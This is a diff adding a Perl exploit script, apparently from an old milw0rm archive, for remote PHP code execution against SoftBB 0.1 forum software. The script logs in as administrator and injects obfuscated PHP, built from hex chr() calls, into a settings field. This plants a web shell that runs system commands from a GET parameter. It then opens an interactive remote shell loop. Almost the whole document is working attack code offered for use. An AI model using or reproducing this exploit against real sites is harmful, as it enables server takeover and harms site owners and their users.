@@ -1,0 +1,120 @@
+#!/usr/bin/perl
+#
+# Affected.scr..: SoftBB 0.1
+# Poc.ID........: 11060904
+# Type..........: PHP code execution, SQL Injection, Full Path Disclosure
+# Risk.level....: High
+# Vendor.Status.: Unpatched
+# Src.download..: softbb.be
+# Poc.link......: acid-root.new.fr/poc/11060904.txt
+# Advisory.link.: acid-root.new.fr/advisories/10060904.txt
+# Credits.......: DarkFig (vuln/exploit/shellcode)
+#
+use Getopt::Long;
+use HTTP::Cookies;
+use HTTP::Request;
+use HTTP::Request::Common "POST";
+use HTTP::Response;
+use LWP::UserAgent;
+
+print STDOUT "\n+", '-' x 69, "+\n";
+print STDOUT "|            SoftBB 0.1 Remote PHP Code Execution Exploit             |\n";
+print STDOUT '+', '-' x 69, "+\n";
+
+my($host,$path,$admin,$passwd,$proxh,$proxu,$proxp);
+my $opt = GetOptions(
+   'host=s'   =>  \$host,
+   'path=s'   =>  \$path,
+   'admin=s'  =>  \$admin,
+   'passwd=s' =>  \$passwd,
+   'proxh=s'  =>  \$proxh,
+   'proxu=s'  =>  \$proxu,
+   'proxp=s'  =>  \$proxp);
+   
+if(!$host or !$admin or !$passwd) {
+    print STDOUT "| Usage: ./xx.pl --host=[www] --path=[/] --admin=[root] --passwd=[XD] |\n";
+    print STDOUT "| [Options] : --proxh=[host] --proxu=[username] --proxp=[password] ---|\n";
+    print STDOUT '+', '-' x 69, "+\n";
+    exit(0);
+}
+
+if($host  !~ /http/) {$host = 'http://'.$host;}
+if($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}
+if(!$path) {$path = '/';}
+
+my $cc = HTTP::Cookies->new();
+my $ua = LWP::UserAgent->new();
+   $ua->cookie_jar($cc);
+   $ua->agent('0xzilla');
+   $ua->timeout(30);
+   $ua->proxy(['http'] => $proxh) if $proxh;
+
+my $re = POST $host.$path.'login.php', [
+         'pseudolog' => $admin,
+         'mdp'       => $passwd,
+         'souvenir'  => 'auto',
+         'Submit'    => 'Connexion'
+         ];
+   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;
+   $ua->request($re);
+
+my $re = $ua->get($host.$path.'admin/gest_opt.php');
+
+if($re->content =~ /Administration/) {
+   print STDOUT " [+]Login successful";} else {
+   print STDOUT " [-]Error during login";
+   print STDOUT '+', '-' x 69, "+\n";
+   exit(0);}
+
+if($re->content =~ /<input type="text" name="nomduforum"  value="(.*?)" class="bouton" \/>/) {
+   $conf[0] = $1;} else {
+   $conf[0] = 'Titre';}
+
+if($re->content =~ /<input type="text" name="mailadmin" value="(.*?)" class="bouton" \/>/) {
+   $conf[1] = $1; } else {
+   $conf[1] = 'root@you.com';}
+
+   # Bypass magic_quotes_gpc and register_globals limits
+   # if(isset($_GET['cmd'])){system(stripslashes($_GET['cmd']));}
+
+my $shcode  = "\n".'$shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);';
+   $shcode .= "\n".'$shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);';
+   $shcode .= "\n".'$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);';
+   $shcode .= "\n".'$shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);';
+   $shcode .= "\n".'$shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);';
+   $shcode .= "\n".'$shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);';
+   $shcode .= "\n".'$shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);';
+   $shcode .= "\n".'$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);';
+   $shcode .= "\n".'$shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);';
+   $shcode .= "\n".'eval($shcode);//';
+
+my $re = POST $host.$path.'admin/save_opt.php', [
+         'nomduforum'       => $conf[0],        'url'              => $host.$path,
+         'mailadmin'        => $conf[1],        'smtp'             => '',
+         'nbsondage'        => 0,               'gzip'             => 'false',
+         'autmodpseudo'     => 'false',         'afflistdelauto'   => 'true',
+         'autorisationsign' => 'true',          'bbcodesign'       => 'true',
+         'ipaff'            => 'true',          'affreprapide'     => 'false',
+         'mailconf'         => 'false',         'cache_forum'      => "false; $shcode",
+         'lockforum'        => 'false',         'message_de_lock'  => '',
+         'lmax'             => 0,               'hmax'             => 0,
+         'pmax'             => 0,               'tmpfreepost'      => 0,
+         'membreparpage'    => 0,               'postparpage'      => 0,
+         'postparpageaff'   => 0,               'Submit'           => 'Enregistrer+les+options',
+         ];
+
+my $da = $ua->request($re);
+if($da->content =~ /Enregistrement/) {
+   print STDOUT "\n [+]Shellcode should be written !";}
+   
+while () {
+       print STDOUT "\n \$sh: ";
+       chomp($cmd = <STDIN>);
+       my $da = $ua->get($host.$path."info_options.php?cmd=$cmd");
+       print STDOUT $da->content;
+       if($cmd eq "exit") {
+          print STDOUT '+', '-' x 69, "+\n";
+          exit(0);}
+}
+
+# milw0rm.com [2006-09-04]
